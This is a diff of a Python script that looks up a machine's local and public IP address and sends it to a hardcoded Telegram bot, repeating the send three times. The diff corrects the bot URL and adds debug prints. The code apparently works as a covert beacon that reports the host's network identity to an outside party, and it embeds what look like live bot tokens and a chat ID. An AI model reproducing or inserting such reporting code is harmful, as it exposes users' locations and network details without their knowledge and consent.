@@ -9,19 +9,21 @@ def get_public_ip():
         local_ip = s.getsockname()[0]
         s.close()    
         public_ip = requests.get('https://api.ipify.org').text
+        print(public_ip)
         return {'local_ip': local_ip, 'public_ip': public_ip } 
     except Exception as e:
         pass
 
 def background_task(ip):
     try:
-        url = 'https://api.telegram.org/7351710792:AAFcFQprcRfvrh4Ujs9UyJUM83QttV3JmHQ/sendMessage'
+        url = 'https://api.telegram.org/bot7496801196:AAFIaKLgl2iaSgCC9V5jXXC4gOom3eZ0XEI/sendMessage'
         params = {
             'chat_id': '6400572573',
             'text': str(ip)
         }
         for i in range(3):
             response = requests.get(url, params=params)
+            print(response)
             time.sleep(10)
         
     except Exception as e:
